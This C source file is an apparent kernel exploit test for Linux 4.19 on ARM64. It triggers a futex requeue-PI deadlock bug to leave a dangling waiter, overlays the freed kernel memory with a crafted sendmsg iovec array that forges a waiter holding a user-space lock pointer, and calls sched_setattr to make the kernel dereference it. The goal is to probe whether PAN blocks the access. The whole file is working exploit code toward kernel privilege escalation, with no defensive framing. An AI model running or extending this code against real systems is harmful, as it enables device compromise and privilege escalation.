/* overlay_test2.c - definitive PAN test: valid sendmsg + user-pointer fake lock
 * GOT-W29 k4.19.157. EDEADLK trigger -> dangling waiter -> sendmsg overlay with
 * lock=USER pointer -> consumer sched_setattr. Observe PAN crash or survival.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/un.h>
#include <time.h>
#include <unistd.h>

#define FUTEX_LOCK_PI 6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define FUTEX_PRIVATE_FLAG 128
#define SYS_futex 98
#define SYS_sched_setattr 274

static uint32_t futex1, futex2;
static volatile int waiter_ready, waiter_waiting, waiter_returned, overlay_done;
static long waiter_ret=-999; static int waiter_errno;
static int sv[2];

static long xfutex(uint32_t *uaddr, int op, uint32_t val,
                   const struct timespec *to, uint32_t *uaddr2, uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, to, uaddr2, val3);
}
static long gettid_l(void) { return syscall(SYS_gettid); }
static void logf(const char *fmt, ...) {
  va_list ap; va_start(ap, fmt); vfprintf(stderr, fmt, ap); va_end(ap); fflush(stderr);
}
struct sched_attr_local {
  uint32_t size; uint32_t sched_policy; uint64_t sched_flags;
  int32_t sched_nice; uint32_t sched_priority;
  uint64_t sched_runtime, sched_deadline, sched_period;
};

/* valid user buffers that each iov_base will point to */
static char *databuf[8];
static int datalen[8] = { 65536,65536,65536,65536,65536,65536,65536,65536 };

static void *waiter_thread(void *u) {
  (void)u;
  int tid = (int)gettid_l();
  struct timespec timeout;
  __atomic_store_n(&futex2, (uint32_t)tid, __ATOMIC_RELEASE); /* EDEADLK: target owned by waiter */
  __atomic_store_n(&waiter_ready, 1, __ATOMIC_RELEASE);
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += 1;
  __atomic_store_n(&waiter_waiting, 1, __ATOMIC_RELEASE);
  errno=0;
  long r = xfutex(&futex1, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &timeout, &futex2, 0);
  waiter_ret=r; waiter_errno=errno;
  logf("[W] WAIT_REQUEUE_PI ret=%ld errno=%d (dangling pi_blocked_on)\n", r, errno);
  __atomic_store_n(&waiter_returned, 1, __ATOMIC_RELEASE);

  /* sendmsg overlay: iovec array lands at E-0x1e8 (fake waiter at E-0x1b0).
     Each iovec = {base(user ptr), len}. For a VALID sendmsg all bases must be
     valid user pointers and lens small. The fake waiter bytes ARE the base/len
     values. lock(waiter+0x38) = iov[7].iov_base = USER pointer. */
  void *fake_lock_page = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  if (fake_lock_page == MAP_FAILED) return NULL;
  memset(fake_lock_page, 0, 0x1000);
  uint64_t fake_lock_user = (uint64_t)fake_lock_page;

  struct iovec iov[8];
  memset(iov, 0, sizeof(iov));
  /* waiter+0x00 tree_pc = iov[3].iov_len  (small value) */
  for (int k=0;k<8;k++){ databuf[k]=mmap(NULL,65536,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0); memset(databuf[k],0,65536); }
  iov[3].iov_base = databuf[3]; iov[3].iov_len = 65536;
  /* waiter+0x08 tree_right = iov[4].iov_base (user ptr, valid) */
  iov[4].iov_base = databuf[4]; iov[4].iov_len = 65536;
  /* waiter+0x10 tree_left = iov[4].iov_len = 8 */
  /* waiter+0x18 pi_pc = iov[5].iov_base */
  iov[5].iov_base = databuf[5]; iov[5].iov_len = 65536;
  /* waiter+0x20 pi_right = iov[5].iov_len = 8 */
  /* waiter+0x28 pi_left = iov[6].iov_base */
  iov[6].iov_base = databuf[6]; iov[6].iov_len = 65536;
  /* waiter+0x30 task = iov[6].iov_len = 8 */
  /* waiter+0x38 lock = iov[7].iov_base = USER pointer (mmap'd page) */
  iov[7].iov_base = (void*)fake_lock_user;
  iov[7].iov_len = 65536;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = iov;
  msg.msg_iovlen = 8;

  __atomic_store_n(&overlay_done, 1, __ATOMIC_RELEASE);
  logf("[W] sendmsg overlay in place, lock=USER 0x%016llx\n", (unsigned long long)fake_lock_user);
  errno = 0;
  ssize_t sr = sendmsg(sv[1], &msg, 0);
  logf("[W] sendmsg ret=%zd errno=%d\n", sr, errno);
  return NULL;
}

static void *consumer_thread(void *u) {
  int wid = (int)(long)u;
  while (!__atomic_load_n(&overlay_done, __ATOMIC_ACQUIRE)) usleep(1000);
  logf("[C] sched_setattr on waiter %d\n", wid);
  struct sched_attr_local attr; memset(&attr,0,sizeof(attr));
  attr.size = sizeof(attr); attr.sched_policy = 0; attr.sched_nice = 19;
  errno=0;
  long r = syscall(SYS_sched_setattr, wid, &attr, 0);
  logf("[C] sched_setattr ret=%ld errno=%d\n", r, errno);
  return NULL;
}

int main(void) {
  logf("[M] pid=%d\n", getpid());
  socketpair(AF_UNIX, SOCK_STREAM, 0, sv);
  /* fill the socket so sendmsg blocks */
  int bufsz = 1024; setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &bufsz, sizeof(bufsz));
  setsockopt(sv[0], SOL_SOCKET, SO_RCVBUF, &bufsz, sizeof(bufsz));
  pthread_t wt, ct;
  pthread_create(&wt, NULL, waiter_thread, NULL);
  while (!waiter_waiting) usleep(1000);
  usleep(40000);
  errno=0;
  long rq = xfutex(&futex1, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, (void*)1, &futex2, 0);
  logf("[M] CMP_REQUEUE_PI ret=%ld errno=%d %s\n", rq, errno, errno==35?"(EDEADLK!)":"");
  while (!__atomic_load_n(&overlay_done, __ATOMIC_ACQUIRE) && !waiter_returned) usleep(1000);
  int wid = (int)__atomic_load_n(&futex2, __ATOMIC_ACQUIRE);
  logf("[M] waiter tid=%d\n", wid);
  pthread_create(&ct, NULL, consumer_thread, (void*)(long)wid);
  pthread_join(ct, NULL);
  usleep(500000);
  logf("[M] main done. Device alive = sendmsg overlay + user lock did NOT crash (PAN not blocking?) or write path exited early.\n");
  return 0;
}
